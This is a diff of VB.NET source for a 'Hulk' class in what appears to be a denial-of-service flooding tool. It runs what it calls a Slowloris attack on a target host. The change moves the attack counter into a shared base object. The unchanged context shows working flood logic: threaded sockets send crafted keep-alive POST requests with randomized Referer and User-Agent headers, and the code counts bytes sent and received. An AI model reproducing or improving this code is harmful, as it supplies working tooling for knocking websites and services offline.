@@ -12,7 +12,6 @@ Public Class Hulk
     Private ThreadstoUse As Integer
     Private Threads As Thread()
     Private AttackRunning As Boolean = False
-    Private Attacks As Integer = 0
     Private RandomFile As Boolean
     Public Sub New(ByVal model As HulkModel)
         If Not AttackRunning = True Then
@@ -50,8 +49,7 @@ Public Class Hulk
             ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
-            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
-            Attacks = 0
+            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
             GetFloodsBase().SetEnd()
         End If
 
@@ -66,8 +64,7 @@ Public Class Hulk
                 End Try
             Next
             AttackRunning = False
-            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
-            Attacks = 0
+            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
 
         Else
             GetFloodsBase().SetMessage("No Slowloris Attack is Running!")
@@ -140,8 +137,8 @@ Public Class Hulk
                         Dim HttpString = "POST /" & file & " HTTP/1.1" & ChrW(13) & ChrW(10) & "Host: " & HostToAttack.ToString() & ChrW(13) & ChrW(10) & "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" & ChrW(13) & ChrW(10) & "Cache-Control: no-cache" & ChrW(13) & ChrW(10) & "Referer: " & referer_list() & buildblock(r.Next(5, 10)) & ChrW(13) & ChrW(10) & "Keep-Alive: " & r.Next(110, 120) & ChrW(13) & ChrW(10) & "Connection: keep-alive" & ChrW(13) & ChrW(10) & "User-Agent: " & headers() & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)
                         socketArray(i).Send(ASCIIEncoding.Default.GetBytes(HttpString), SocketFlags.None)
 
-                        Attacks = Attacks + 1
-                        GetFloodsBase().Set_AttackUpStrengOnByte(Attacks * HttpString.Length)
+                        GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
+                        GetFloodsBase().Set_AttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * HttpString.Length)
 
                     Next i
                     Dim j As Integer
@@ -155,7 +152,7 @@ Public Class Hulk
                             sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                         Loop Until bytes > 0
 
-                        GetFloodsBase().Set_AttackDownStrengOnByte(Attacks * sb.ToString().Length)
+                        GetFloodsBase().Set_AttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * sb.ToString().Length)
                         socketArray(j).Close()
                     Next j
                     Continue Do
